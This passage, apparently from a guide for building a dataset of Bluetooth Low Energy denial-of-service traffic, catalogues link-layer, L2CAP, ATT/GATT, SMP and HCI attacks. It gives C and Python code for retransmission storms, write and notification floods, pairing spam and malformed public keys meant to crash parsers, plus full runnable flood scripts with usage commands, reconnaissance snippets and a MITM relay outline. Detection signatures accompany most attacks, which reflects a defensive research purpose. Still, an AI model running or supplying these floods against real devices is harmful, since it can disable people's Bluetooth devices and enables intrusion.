        sd_ble_gap_tx_power_set(conn_handle, 4);  // Max power
        ble_ll_conn_tx_pdu(conn_handle, empty_pdu, 2);
        
        // Wait for next connection event (determined by connection interval)
        wait_for_next_conn_event();
    }
}
```

**Expected Victim Behavior:**
- CPU cycles wasted processing empty packets
- ACK/NESN handling overhead
- No useful data transferred

**Detection Signatures:**
- High rate of zero-length LL Data PDUs
- SN/NESN toggle correctly (distinguishes from malformed traffic)

---

#### Attack 3.2.4: Retransmission Storm (SN/NESN Manipulation)
**Description:** Send data with fixed SN, forcing victim to retransmit indefinitely.

**Header Fields Manipulated:**
- SN: Fixed at `0` (never toggle)
- NESN: Fixed at `1` (never acknowledge victim's packets)

**Hardware:** nRF52840 or SDR (requires LL-level control)

**Implementation Approach:**
```c
void retransmission_storm(uint16_t conn_handle) {
    uint8_t attack_pdu[10];
    
    attack_pdu[0] = 0x02;  // LLID=2 (new data), NESN=1 (never ACK), SN=0 (fixed)
    attack_pdu[1] = 0x08;  // Length=8
    memset(&attack_pdu[2], 0xAA, 8);  // Dummy payload
    
    while (attack_active) {
        ble_ll_conn_tx_pdu(conn_handle, attack_pdu, 10);
        // Don't increment SN
        // Victim sees SN=0 repeatedly, thinks packet lost, retransmits own
    }
}
```

**Expected Victim Behavior:**
- Victim retransmits data packets thinking they weren't ACKed
- Retransmit counter increments (some devices disconnect after N retries)
- Connection may drop due to supervision timeout

**Detection Signatures:**
- Same SN repeated across multiple connection events
- NESN doesn't increment (attacker never ACKs)
- High retransmission count in LL stats

---

### 3.3 Protocol Layer Attacks (L2CAP/ATT/GATT/SMP)

#### Attack 3.3.1: L2CAP Connection Parameter Update Storm
**Description:** Flood victim with rapid L2CAP Connection Parameter Update Requests.

**Header Fields Manipulated:**
- L2CAP CID: `0x0005` (LE Signaling Channel)
- Code: `0x12` (Connection Parameter Update Request)
- Identifier: Increment for each request
- Interval_Min/Max, Latency, Timeout: Use extreme values

**Hardware:** Laptop/RPi (L2CAP socket)

**Implementation Approach:**
```python
function l2cap_param_update_storm(victim_addr, rate_hz, duration_s):
    conn = ble_connect(victim_addr)
    l2cap_socket = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP)
    l2cap_socket.connect((victim_addr, 0x0005))  # CID 0x0005
    
    identifier = 1
    stop_time = now() + duration_s
    
    while now() < stop_time:
        # Build L2CAP Connection Parameter Update Request
        packet = struct.pack('<BBHHHHHH',
            0x12,  # Code: Connection Parameter Update Request
            identifier,
            12,    # Length
            0x0006,  # Interval Min = 7.5ms
            0x0C80,  # Interval Max = 4s (conflicting range)
            0x01F3,  # Latency = 499
            0x000A   # Timeout = 100ms (very short)
        )
        
        l2cap_socket.send(packet)
        identifier = (identifier + 1) % 256
        
        sleep(1.0 / rate_hz)
```

**Expected Victim Behavior:**
- Must process each request and decide accept/reject
- Parameter validation overhead
- If accepted, connection params change frequently (destabilizing)

**Detection Signatures:**
- High rate of L2CAP Code 0x12 packets
- Incrementing Identifier field
- Conflicting parameter values (Interval_Min > Interval_Max)

---

#### Attack 3.3.2: L2CAP Length Mismatch
**Description:** Declare large L2CAP Length in header, but send minimal HCI ACL data.

**Header Fields Manipulated:**
- L2CAP Length: `65535` bytes
- HCI ACL Data Total Length: `10` bytes

**Hardware:** Laptop/RPi (raw HCI ACL socket)

**Implementation Approach:**
```python
function l2cap_length_mismatch(conn_handle):
    # HCI ACL Data Packet format
    hci_acl_packet = struct.pack('<BHBB',
        0x02,       # HCI ACL Data packet type
        conn_handle | (0x2 << 12),  # Handle + PB=First(0x2), BC=0
        10,         # HCI Data Total Length = 10 bytes
        0,          # (Little-endian continued)
    )
    
    # L2CAP Header (part of HCI ACL Data)
    l2cap_header = struct.pack('<HH',
        65535,   # L2CAP Length (claims 65535 bytes follow)
        0x0004   # CID: ATT
    )
    
    # Only send 10 bytes total (4 L2CAP header + 6 dummy)
    hci_acl_packet += l2cap_header + b'\x00' * 6
    
    hci_socket.send(hci_acl_packet)
    # Victim waits for 65535 bytes, never arrives → buffer exhaustion
```

**Expected Victim Behavior:**
- Reassembly buffer allocated for 65535 bytes
- Timeout waiting for remaining fragments
- Memory exhaustion if repeated

**Detection Signatures:**
- L2CAP Length >> HCI ACL Data Length
- No subsequent HCI ACL fragments with PB=Continuing

---

#### Attack 3.3.3: ATT Write Without Response Flood (Primary DoS)
**Description:** Maximum-rate flood of ATT Write Commands (0x52) with max MTU payloads.

**Header Fields Manipulated:**
- ATT Opcode: `0x52` (Write Command - no response required)
- Attribute Handle: Target writable characteristic
- Value: Max MTU (512 bytes after MTU exchange)

**Hardware:** Laptop/RPi (via `bleak`) or nRF52840

**Implementation Approach:**
```python
async def att_write_without_response_flood(victim_addr, char_uuid, rate_hz, duration_s):
    client = BleakClient(victim_addr)
    await client.connect()
    
    # Exchange MTU to max (517 bytes: 3 ATT overhead + 514 payload)
    await client.exchange_mtu(517)
    
    # Craft max-length payload
    payload = b'\xFF' * 512  # Max ATT MTU after MTU exchange
    
    stop_time = time.time() + duration_s
    count = 0
    
    while time.time() < stop_time:
        try:
            # Write Without Response (bleak automatically uses 0x52)
            await client.write_gatt_char(char_uuid, payload, response=False)
            count += 1
            
            if rate_hz > 0:
                await asyncio.sleep(1.0 / rate_hz)
        except BleakError as e:
            log_error('write_failed', e)
            await asyncio.sleep(0.1)  # Backoff
    
    await client.disconnect()
    log_metric('total_writes', count)
```

**Expected Victim Behavior:**
- Server must process 512-byte writes immediately
- No flow control (no response = no backpressure)
- Memory allocation for each write
- Characteristic value update logic executes (application-dependent overhead)

**Detection Signatures:**
- High rate of ATT Opcode 0x52
- Consistent large Value length (512 bytes)
- No corresponding ATT responses (0x13)

**Capture Metadata:**
```json
{
  "attack_type": "att_write_no_response_flood",
  "rate_hz": 100,
  "duration_s": 30,
  "payload_size_bytes": 512,
  "characteristic_uuid": "0000ffe1-0000-1000-8000-00805f9b34fb",
  "mtu_negotiated": 517
}
```

---

#### Attack 3.3.4: ATT Write Request Flood (Response Queue Exhaustion)
**Description:** Flood with ATT Write Requests (0x12) requiring ATT Write Response (0x13).

**Header Fields Manipulated:**
- ATT Opcode: `0x12` (Write Request)
- Attribute Handle: Writable characteristic
- Value: Variable size

**Hardware:** Laptop/RPi (via `bleak`)

**Implementation Approach:**
```python
async def att_write_request_flood(victim_addr, char_uuid, rate_hz, duration_s):
    client = BleakClient(victim_addr)
    await client.connect()
    
    payload = b'\xAA' * 100
    stop_time = time.time() + duration_s
    pending_responses = []
    
    while time.time() < stop_time:
        try:
            # Write Request (bleak uses 0x12 when response=True)
            response_future = client.write_gatt_char(char_uuid, payload, response=True)
            pending_responses.append(response_future)
            
            # Don't await response immediately → queue builds up
            if len(pending_responses) > 50:
                # Force wait for some responses to avoid client-side queue overflow
                await asyncio.gather(*pending_responses[:25])
                pending_responses = pending_responses[25:]
            
            await asyncio.sleep(1.0 / rate_hz)
        except BleakError as e:
            log_error('write_request_failed', e)
    
    # Wait for remaining responses
    await asyncio.gather(*pending_responses)
    await client.disconnect()
```

**Expected Victim Behavior:**
- Must send ATT Write Response (0x13) for each request
- Response queue fills up
- Processing delay increases with queue depth

**Detection Signatures:**
- High rate of ATT Opcode 0x12
- Corresponding rate of ATT Opcode 0x13 (responses)
- Increasing latency between 0x12 and 0x13 (queue buildup)

---

#### Attack 3.3.5: ATT Read Request Flood
**Description:** Force server to repeatedly retrieve and send characteristic values.

**Header Fields Manipulated:**
- ATT Opcode: `0x0A` (Read Request)
- Attribute Handle: Readable characteristic

**Hardware:** Laptop/RPi (via `bleak`)

**Implementation Approach:**
```python
async def att_read_request_flood(victim_addr, char_uuid, rate_hz, duration_s):
    client = BleakClient(victim_addr)
    await client.connect()
    
    stop_time = time.time() + duration_s
    
    while time.time() < stop_time:
        try:
            value = await client.read_gatt_char(char_uuid)
            # Discard value, just force server to retrieve it
        except BleakError as e:
            log_error('read_failed', e)
        
        await asyncio.sleep(1.0 / rate_hz)
    
    await client.disconnect()
```

**Expected Victim Behavior:**
- Server retrieves characteristic value from application layer
- Sends ATT Read Response (0x0B) with value
- If value is dynamically generated (e.g., sensor reading), overhead per read

**Detection Signatures:**
- High rate of ATT Opcode 0x0A
- Corresponding ATT Opcode 0x0B responses

---

#### Attack 3.3.6: GATT Notification Storm (Peripheral → Central)
**Description:** If controlling peripheral, send notifications at max rate to central.

**Header Fields Manipulated:**
- ATT Opcode: `0x1B` (Handle Value Notification)
- Attribute Handle: Characteristic with Notify property
- Value: Max MTU payload

**Hardware:** nRF52840 (as peripheral) or Laptop/RPi (BlueZ GATT server)

**Implementation Approach:**
```c
// nRF52840 peripheral firmware
void gatt_notification_storm(uint16_t conn_handle, uint16_t char_handle) {
    uint8_t notification_data[512];
    memset(notification_data, 0xBB, 512);
    
    ble_gatts_hvx_params_t hvx_params = {
        .handle = char_handle,
        .type = BLE_GATT_HVX_NOTIFICATION,  // 0x1B
        .offset = 0,
        .p_len = &(uint16_t){512},
        .p_data = notification_data
    };
    
    while (attack_active) {
        sd_ble_gatts_hvx(conn_handle, &hvx_params);
        // No delay → max rate limited by connection interval
    }
}
```

**Expected Victim Behavior:**
- Central must process each notification
- Application callbacks invoked for each
- High CPU usage, potential buffer overflow if app doesn't consume fast enough

**Detection Signatures:**
- High rate of ATT Opcode 0x1B
- Large notification payloads
- Single characteristic handle repeated

---

#### Attack 3.3.7: GATT Indication Flood (Requires Confirmation)
**Description:** Send indications (0x1D) faster than central can confirm (0x1E).

**Header Fields Manipulated:**
- ATT Opcode: `0x1D` (Handle Value Indication)
- Attribute Handle: Characteristic with Indicate property

**Hardware:** nRF52840 (peripheral)

**Implementation Approach:**
```c
void gatt_indication_flood(uint16_t conn_handle, uint16_t char_handle) {
    uint8_t indication_data[100];
    memset(indication_data, 0xCC, 100);
    
    ble_gatts_hvx_params_t hvx_params = {
        .handle = char_handle,
        .type = BLE_GATT_HVX_INDICATION,  // 0x1D
        .offset = 0,
        .p_len = &(uint16_t){100},
        .p_data = indication_data
    };
    
    while (attack_active) {
        sd_ble_gatts_hvx(conn_handle, &hvx_params);
        // SoftDevice queues indication, waits for ATT_Handle_Value_Confirmation (0x1E)
        // If confirmations slow, queue fills → detection
        
        // Short delay to avoid immediate SoftDevice queue overflow
        nrf_delay_ms(10);
    }
}
```

**Expected Victim Behavior:**
- Central must send ATT Handle Value Confirmation (0x1E) for each indication
- If confirmations too slow, peripheral's indication queue backs up
- Some stacks drop new indications if queue full

**Detection Signatures:**
- High rate of ATT Opcode 0x1D
- Corresponding ATT Opcode 0x1E, but delayed or missing
- Indication IDs may repeat (if dropped and retried)

---

#### Attack 3.3.8: SMP Pairing Request Spam
**Description:** Repeatedly initiate pairing without completing the handshake.

**Header Fields Manipulated:**
- SMP Code: `0x01` (Pairing Request)
- IO Capability: `0x03` (NoInputNoOutput - Just Works pairing)
- OOB Flag: `0x00`
- Auth Req: Varies
- Max Key Size: `0x07` (minimum, 7 bytes)

**Hardware:** nRF52840 (realistic pairing control) or Laptop/RPi (via BlueZ agent, limited)

**Implementation Approach:**
```python
# Laptop/RPi (BlueZ D-Bus agent)
def smp_pairing_request_spam(victim_addr, rate_hz, duration_s):
    import dbus
    bus = dbus.SystemBus()
    adapter = bus.get_object('org.bluez', '/org/bluez/hci0')
    
    stop_time = time.time() + duration_s
    
    while time.time() < stop_time:
        try:
            device = get_bluez_device(bus, victim_addr)
            device.Pair(timeout=1)  # Initiate pairing, timeout quickly
        except dbus.DBusException as e:
            # Pairing will fail/timeout, that's expected
            pass
        
        time.sleep(1.0 / rate_hz)
```

**nRF52840 (more control):**
```c
void smp_pairing_spam(uint16_t conn_handle) {
    ble_gap_sec_params_t sec_params = {
        .bond = 0,
        .mitm = 0,
        .io_caps = BLE_GAP_IO_CAPS_NONE,  // Just Works
        .oob = 0,
        .min_key_size = 7,
        .max_key_size = 7,  // Weak key size
    };
    
    while (attack_active) {
        sd_ble_gap_authenticate(conn_handle, &sec_params);
        // Don't respond to subsequent Pairing Response from peripheral
        // Connection maintains pairing state until timeout
        nrf_delay_ms(500);
    }
}
```

**Expected Victim Behavior:**
- Allocates pairing state structure for each request
- Waits for pairing completion (timeout after 30s typical)
- If requests exceed max simultaneous pairings, new requests fail

**Detection Signatures:**
- High rate of SMP Code 0x01 (Pairing Request)
- No corresponding SMP Code 0x05 (Pairing Failed) or successful completion
- Multiple incomplete pairing states

---

#### Attack 3.3.9: SMP Invalid Public Key
**Description:** Send malformed elliptic curve public keys to crash parsing.

**Header Fields Manipulated:**
- SMP Code: `0x0C` (Pairing Public Key)
- Public Key X/Y: Invalid EC points (e.g., all zeros, not on curve)

**Hardware:** nRF52840 (requires custom firmware to bypass SoftDevice validation)

**Implementation Approach:**
```c
void smp_invalid_public_key(uint16_t conn_handle) {
    // Initiate LE Secure Connections pairing
    ble_gap_sec_params_t sec_params = {
        .bond = 1,
        .mitm = 1,
        .lesc = 1,  // LE Secure Connections
        .io_caps = BLE_GAP_IO_CAPS_KEYBOARD_DISPLAY,
    };
    sd_ble_gap_authenticate(conn_handle, &sec_params);
    
    // Wait for Pairing Response
    wait_for_smp_event(SMP_PAIRING_RESPONSE);
    
    // Send invalid public key (bypass SoftDevice, use raw L2CAP)
    uint8_t invalid_public_key[65];
    invalid_public_key[0] = 0x0C;  // SMP Code: Pairing Public Key
    memset(&invalid_public_key[1], 0x00, 64);  // All zeros (not on curve)
    
    send_l2cap_packet(conn_handle, 0x0006, invalid_public_key, 65);  // CID 0x0006 = SMP
}
```

**Expected Victim Behavior:**
- **Best case:** Validation detects invalid point, sends Pairing Failed
- **Worst case:** Parser crashes (buffer overflow, assertion failure in EC library)

**Detection Signatures:**
- SMP Code 0x0C with public key data that fails EC validation
- Immediate SMP Code 0x05 (Pairing Failed) with reason "DHKey Check Failed"
- Or device disconnection/reset after receiving invalid key

---

### 3.4 Host Stack Attacks

#### Attack 3.4.1: HCI Command Storm
**Description:** Flood controller with HCI commands faster than it can process.

**Header Fields Manipulated:**
- Multiple OpCodes rapidly (LE Set Advertising Enable, LE Set Scan Parameters, etc.)

**Hardware:** Laptop/RPi (raw HCI socket)

**Implementation Approach:**
```python
def hci_command_storm(iface, duration_s):
    hci_socket = open_hci_socket(iface)
    
    # List of HCI commands to spam
    commands = [
        build_hci_command(0x08, 0x000A, b'\x01'),  # LE Set Advertising Enable ON
        build_hci_command(0x08, 0x000A, b'\x00'),  # LE Set Advertising Enable OFF
        build_hci_command(0x08, 0x0006, struct.pack('<BHHB', 0x01, 0x0010, 0x0010, 0x00)),  # LE Set Scan Params
        build_hci_command(0x03, 0x0003, b''),  # Reset
    ]
    
    stop_time = time.time() + duration_s
    count = 0
    
    while time.time() < stop_time:
        for cmd in commands:
            hci_socket.send(cmd)
            count += 1
            # Don't wait for Command Complete events
    
    log_metric('commands_sent', count)
```

**Expected Victim Behavior:**
- Controller command queue fills up
- Commands dropped silently or Command Status returns error
- Controller may reset if queue overflows

**Detection Signatures:**
- High rate of HCI commands in btmon
- Command Complete event rate < Command rate (backlog)
- Error codes in Command Complete events (0x01 = Unknown HCI Command, 0x0C = Command Disallowed)

---

#### Attack 3.4.2: HCI ACL Fragmentation Exhaustion
**Description:** Send HCI ACL "continuing" fragments without initial fragment.

**Header Fields Manipulated:**
- HCI ACL PB (Packet Boundary): `0x1` (Continuing fragment)
- Never send PB=`0x2` (First fragment) or PB=`0x3` (Complete)

**Hardware:** Laptop/RPi (raw HCI socket)

**Implementation Approach:**
```python
def hci_acl_fragmentation_exhaustion(conn_handle):
    hci_socket = open_hci_socket('hci0')
    
    for i in range(1000):
        # HCI ACL Data Packet: continuing fragment
        hci_acl_header = struct.pack('<HH',
            0x0002,  # Packet type: ACL Data
            conn_handle | (0x1 << 12),  # Handle + PB=Continuing(0x1)
        )
        hci_acl_data_len = struct.pack('<H', 27)  # 27 bytes of data
        dummy_data = b'\xDD' * 27
        
        packet = hci_acl_header + hci_acl_data_len + dummy_data
        hci_socket.send(packet)
    
    # Victim host stack buffers all fragments waiting for first fragment
    # Reassembly buffer never completes → memory leak
```

**Expected Victim Behavior:**
- Host stack allocates reassembly buffer for each connection
- Fragments accumulated indefinitely (no timeout in some stacks)
- Memory exhaustion

**Detection Signatures:**
- HCI ACL packets with PB=0x1 but no preceding PB=0x2
- Reassembly buffer never frees (requires host-side monitoring)

---

### 3.5 Reconnaissance & MITM Attacks (Context for DoS)

> These are not DoS attacks, but useful context for understanding the attack surface.

#### Attack 3.5.1: Passive Sniffing (Reconnaissance)
**Description:** Capture BLE traffic without active transmission.

**Tools:** Ubertooth One

**Approach:**
```bash
ubertooth-btle -f -c passive_capture.pcap
# Captures all advertising + data channel traffic (if connection followed)
# Use in Wireshark for analysis
```

**What You Learn:**
- Device addresses (AdvAddr)
- Services advertised (via AdvData or GATT discovery)
- Connection parameters
- Encrypted vs unencrypted traffic
- RSSI (signal strength) for location tracking

**ML Feature Extraction:**
- Baseline benign traffic patterns
- Packet inter-arrival times
- PDU type distribution
- RSSI variance

---

#### Attack 3.5.2: Active Scanning (Service Discovery)
**Description:** Send SCAN_REQ to all advertisers, collect SCAN_RSP.

**Hardware:** Laptop/RPi

**Approach:**
```bash
sudo hcitool lescan
# Or programmatically:
```

```python
from bleak import BleakScanner

async def active_scan_reconnaissance():
    devices = await BleakScanner.discover(timeout=30)
    for device in devices:
        print(f"Address: {device.address}, Name: {device.name}, RSSI: {device.rssi}")
        print(f"  AdvData: {device.metadata['manufacturer_data']}")
```

**What You Learn:**
- All nearby BLE devices
- Device names (from SCAN_RSP or AdvData)
- Manufacturer data
- Service UUIDs advertised

**Use in Attack Planning:**
- Identify target devices
- Determine which services to target for GATT floods

---

#### Attack 3.5.3: GATT Service Enumeration
**Description:** Connect and read all services/characteristics.

**Hardware:** Laptop/RPi

**Approach:**
```python
async def gatt_service_enumeration(victim_addr):
    client = BleakClient(victim_addr)
    await client.connect()
    
    services = await client.get_services()
    
    for service in services:
        print(f"Service: {service.uuid}")
        for char in service.characteristics:
            print(f"  Characteristic: {char.uuid}, Properties: {char.properties}")
            
            if 'read' in char.properties:
                value = await client.read_gatt_char(char.uuid)
                print(f"    Value: {value.hex()}")
    
    await client.disconnect()
```

**What You Learn:**
- Which characteristics are writable (for Write floods)
- Which support notifications (for storm attacks)
- Characteristic UUIDs needed for targeted attacks

---

#### Attack 3.5.4: Man-in-the-Middle (MITM)
**Description:** Relay connection between victim and legitimate device, intercept/modify data.

**Requirements:** Two nRF52840 dongles (one acts as peripheral relay, one as central relay)

**Approach (High-Level):**
```
Legitimate Central ↔ nRF#1 (impersonates peripheral) ↔ nRF#2 (impersonates central) ↔ Legitimate Peripheral

nRF#1 Firmware:
- Advertise with same AdvAddr/AdvData as legitimate peripheral
- Accept connection from legitimate central
- Forward all ATT requests to nRF#2

nRF#2 Firmware:
- Connect to legitimate peripheral
- Forward ATT responses back to nRF#1
- Can modify data in transit
```

**Vulnerability Exploited:**
- No authentication in pairing (if Just Works or No Pairing)
- MITM can downgrade to Just Works

**Use in DoS Context:**
- Demonstrates lack of authentication → DoS attacks cannot be attributed
- Can amplify DoS by modifying legitimate traffic

---

## 4. Implementation Guide - Attack by Attack

### 4.1 Laptop/BlueZ Attacks (80% of catalog)

#### 4.1.1 Setup: Raw HCI Socket Access

**Prerequisites:**
```bash
# Stop bluetoothd to avoid conflicts
sudo systemctl stop bluetooth

# Bring interface down and up
sudo hciconfig hci0 down
sudo hciconfig hci0 up

# Verify interface status
hciconfig hci0
```

**Python Raw HCI Socket Template:**
```python
import socket
import struct

def open_hci_socket(device_id=0):
    sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)
    sock.bind((device_id,))
    return sock

def build_hci_command(ogf, ocf, params=b''):
    """
    ogf: Opcode Group Field (6 bits)
    ocf: Opcode Command Field (10 bits)
    params: Command parameters (bytes)
    """
    opcode = (ogf << 10) | ocf
    packet = struct.pack('<BHB', 0x01, opcode, len(params)) + params
    return packet

def send_hci_command(sock, ogf, ocf, params=b''):
    cmd = build_hci_command(ogf, ocf, params)
    sock.send(cmd)
    # Optionally read Command Complete event
    # response = sock.recv(260)
    # return response

# Example: LE Set Advertising Enable
hci_sock = open_hci_socket(0)
send_hci_command(hci_sock, ogf=0x08, ocf=0x000A, params=b'\x01')  # Enable
```

---

#### 4.1.2 Full Implementation: Advertising Flood

```python
#!/usr/bin/env python3
"""
adv_flood.py - Basic advertising flood using raw HCI
Hardware: Laptop/RPi with BlueZ
"""

import socket
import struct
import time
import sys

def open_hci_socket(device_id=0):
    sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)
    sock.bind((device_id,))
    return sock

def hci_command(sock, ogf, ocf, params=b''):
    opcode = (ogf << 10) | ocf
    packet = struct.pack('<BHB', 0x01, opcode, len(params)) + params
    sock.send(packet)
    time.sleep(0.01)  # Small delay for command processing

def advertising_flood(device_id, rate_hz, duration_s):
    sock = open_hci_socket(device_id)
    
    # Craft max-length advertising data
    adv_data = b'\x1E' + b'\xFF' * 30  # Length=30, data=0xFF repeated
    
    # Advertising parameters
    adv_params = struct.pack('<HHBBBBB6sBB',
        0x00A0,  # Adv Interval Min (100ms)
        0x00A0,  # Adv Interval Max
        0x00,    # Adv Type: ADV_IND
        0x01,    # Own Address Type: Random
        0x00,    # Peer Address Type
        b'\x00' * 6,  # Peer Address
        0x07,    # Adv Channel Map (all 3 channels)
        0x00     # Adv Filter Policy
    )
    
    # Set advertising parameters
    hci_command(sock, 0x08, 0x0006, adv_params)
    
    # Set advertising data
    adv_data_cmd = struct.pack('<B31s', len(adv_data), adv_data)
    hci_command(sock, 0x08, 0x0008, adv_data_cmd)
    
    print(f"Starting advertising flood: {rate_hz} Hz for {duration_s}s")
    
    stop_time = time.time() + duration_s
    count = 0
    
    try:
        while time.time() < stop_time:
            # Enable advertising
            hci_command(sock, 0x08, 0x000A, b'\x01')
            
            # Disable advertising (creates rapid toggle)
            hci_command(sock, 0x08, 0x000A, b'\x00')
            
            count += 1
            time.sleep(1.0 / rate_hz)
    
    except KeyboardInterrupt:
        print("\nStopping...")
    
    # Ensure advertising is disabled
    hci_command(sock, 0x08, 0x000A, b'\x00')
    sock.close()
    print(f"Sent {count} advertising enable/disable cycles")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: sudo python3 adv_flood.py <device_id> <rate_hz> <duration_s>")
        print("Example: sudo python3 adv_flood.py 0 10 30")
        sys.exit(1)
    
    device_id = int(sys.argv[1])
    rate_hz = float(sys.argv[2])
    duration_s = float(sys.argv[3])
    
    advertising_flood(device_id, rate_hz, duration_s)
```

**Usage:**
```bash
sudo python3 adv_flood.py 0 10 30
# Device hci0, 10 Hz rate, 30 seconds duration
```

---

#### 4.1.3 Full Implementation: ATT Write Without Response Flood

```python
#!/usr/bin/env python3
"""
att_write_flood.py - GATT Write Without Response flood
Hardware: Laptop/RPi with BlueZ
"""

import asyncio
from bleak import BleakClient
import time
import sys

async def write_flood(address, char_uuid, rate_hz, duration_s, payload_size):
    print(f"Connecting to {address}...")
    
    async with BleakClient(address, timeout=30.0) as client:
        print(f"Connected. MTU: {client.mtu_size}")
        
        # Craft payload
        payload = b'\xFF' * min(payload_size, client.mtu_size - 3)
        
        print(f"Starting Write Without Response flood:")
        print(f"  Rate: {rate_hz} Hz")
        print(f"  Duration: {duration_s}s")
        print(f"  Payload size: {len(payload)} bytes")
        
        stop_time = time.time() + duration_s
        count = 0
        errors = 0
        
        while time.time() < stop_time:
            try:
                await client.write_gatt_char(char_uuid, payload, response=False)
                count += 1
                
                if rate_hz > 0:
                    await asyncio.sleep(1.0 / rate_hz)
            
            except Exception as e:
                errors += 1
                if errors % 10 == 0:
                    print(f"Errors: {errors}")
                await asyncio.sleep(0.1)
        
        print(f"\nFlood complete:")
        print(f"  Successful writes: {count}")
        print(f"  Errors: {errors}")
        print(f"  Actual rate: {count / duration_s:.2f} Hz")

if __name__ == "__main__":
    if len(sys.argv) != 6:
        print("Usage: python3 att_write_flood.py <address> <char_uuid> <rate_hz> <duration_s> <payload_size>")
        print("Example: python3 att_write_flood.py AA:BB:CC:DD:EE:FF 0000ffe1-0000-1000-8000-00805f9b34fb 50 30 512")
        sys.exit(1)
    
    address = sys.argv[1]
    char_uuid = sys.argv[2]
    rate_hz = float(sys.argv[3])
    duration_s = float(sys.argv[4])
    payload_size = int(sys.argv[5])
    
    asyncio.run(write_flood(address, char_uuid, rate_hz, duration_s, payload_size))
```

**Usage:**
```bash
# First, discover writable characteristics
python3 -c "
import asyncio
from bleak import BleakClient

async def discover(addr):
    async with BleakClient(addr) as c:
        for s in await c.get_services():
            for ch in s.characteristics:
                if 'write' in ch.properties or 'write-without-response' in ch.properties:
                    print(f'{ch.uuid}: {ch.properties}')
asyncio.run(discover('AA:BB:CC:DD:EE:FF'))
"

# Then run flood
python3 att_write_flood.py AA:BB:CC:DD:EE:FF 0000ffe1-0000-1000-8000-00805f9b34fb 50 30 512
```

---

#### 4.1.4 Pseudocode: L2CAP Signaling Flood

```python
def l2cap_connection_param_update_storm(victim_addr, rate_hz, duration_s):
    """
    Send rapid L2CAP Connection Parameter Update Requests
    Hardware: Laptop/RPi (L2CAP socket)
    """
    
    # Establish BLE connection first
    ble_conn = connect_ble(victim_addr)
    
    # Open L2CAP socket to signaling channel (CID 0x0005)
    l2cap_sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP)
    l2cap_sock.connect((victim_addr, 0x0005))  # PSM/CID for LE Signaling
    
    identifier = 1
    stop_time = now() + duration_s
    
    while now() < stop_time:
        # L2CAP Connection Parameter Update Request format:
        # Code=0x12, Identifier, Length=12, Interval_Min, Interval_Max, Latency, Timeout
        packet = struct.pack('<BBHHHHHH',
            0x12,       # Code
            identifier,
            12,         # Length
            0x0006,     # Interval_Min = 7.5ms
            0x0C80,     # Interval_Max = 4s (conflicting, invalid)
            0x01F3,     # Latency = 499 (max)
            0x000A      # Timeout = 100ms (min)
        )
        
        l2cap_sock.send(packet)
        identifier = (identifier + 1) % 256
        
        sleep(1.0 / rate_hz)
    
    l2cap_sock.close()
    ble_conn.disconnect()
```

---

### 4.2 nRF52840 Attacks (20% of catalog, high-precision)

#### 4.2.1 Setup: nRF52840 Development Environment

**Hardware Options:**
- nRF52840 Dongle (PCA10059) - $10, USB dongle form factor
- nRF52840 DK (PCA10056) - $45, dev board with debugger

**Firmware Options:**

| Firmware | Complexity | Control Level | Use Case |
|----------|-----------|---------------|----------|
| Nordic SDK Examples | Low | Medium | Standard attacks (connection, GATT) |
| Zephyr RTOS | Medium | High | Timing-critical, multi-threading |
| Apache Mynewt NimBLE | Medium | High | Full stack control, hooks |
| Bare-metal | High | Full | Link-layer manipulation |

**Recommended Starting Point: Zephyr RTOS**

```bash
# Install Zephyr
pip3 install --user west
west init ~/zephyrproject
cd ~/zephyrproject
west update

# Install dependencies
pip3 install -r ~/zephyrproject/zephyr/scripts/requirements.txt

# Build sample
cd ~/zephyrproject/zephyr
west build -b nrf52840dongle_nrf52840 samples/bluetooth/peripheral

# Flash (for dongle, requires bootloader mode)
nrfutil pkg generate --hw-version 52 --sd-req=0x00 \
    --application build/zephyr/zephyr.hex \
    --application-version 1 pkg.zip
nrfutil dfu usb-serial -pkg pkg.zip -p /dev/ttyACM0
```

---

#### 4.2.2 Pseudocode: Empty Packet Flood (nRF52840)

```c
/**
 * empty_packet_flood.c - LL Data PDU with zero payload
 * Hardware: nRF52840
 * Firmware: Zephyr or Nordic SDK with SoftDevice
 */

#include <bluetooth/bluetooth.h>
#include <bluetooth/conn.h>

static struct bt_conn *attack_conn;

void empty_packet_flood_worker(void) {
    uint8_t empty_data[1] = {0};  // Minimal payload
    struct bt_gatt_write_params write_params;
    
    while (attack_active) {
        // Send zero-length L2CAP packet (will be wrapped in LL Data PDU)
        // Length=0 at LL layer requires firmware-level access
        
        // Workaround: Send minimal ATT write (1 byte) at max rate
        write_params.data = empty_data;
        write_params.length = 1;
        write_params.func = NULL;  // No callback needed
        
        bt_gatt_write_without_response(attack_conn, 0x0010, empty_data, 1, false);
        
        // No delay → max rate (limited by connection interval)
        k_yield();  // Yield to Zephyr scheduler
    }
}

void start_attack(struct bt_conn *conn) {
    attack_conn = conn;
    attack_active = true;
    
    // Create thread for flood
    k_thread_create(&flood_thread, flood_stack, K_THREAD_STACK_SIZEOF(flood_stack),
                    (k_thread_entry_t)empty_packet_flood_worker,
                    NULL, NULL, NULL, K_PRIO_PREEMPT(0), 0, K_NO_WAIT);
}
```

---

#### 4.2.3 Pseudocode: SMP Pairing Request Spam (nRF52840)

```c
/**
 * smp_pairing_spam.c - Repeated pairing requests
 * Hardware: nRF52840
 */

#include <bluetooth/bluetooth.h>
#include <bluetooth/conn.h>

void smp_pairing_spam(struct bt_conn *conn) {
    struct bt_conn_auth_cb auth_callbacks = {
        .pairing_confirm = NULL,  // Don't confirm pairing
        .passkey_entry = NULL,
        .cancel = NULL,
    };
    
    bt_conn_auth_cb_register(&auth_callbacks);
    
    while (attack_active) {
        // Initiate pairing
        int err = bt_conn_set_security(conn, BT_SECURITY_L2);
        
        if (err) {
            printk("Pairing initiation error: %d\n", err);
        }
        
        // Don't complete pairing, let it timeout
        k_sleep(K_MSEC(500));  // Wait 500ms before next request
    }
}

// In main connection callback:
void connected(struct bt_conn *conn, uint8_t err) {
    if (err) {
        return;
    }
    
    char addr_str[BT_ADDR_LE_STR_LEN];
    bt_addr_le_to_str(bt_conn_get_dst(conn), addr_str, sizeof(addr_str));
    printk("Connected: %s\n", addr_str);
    
    // Start pairing spam
    smp_pairing_spam(conn);
}
```

---

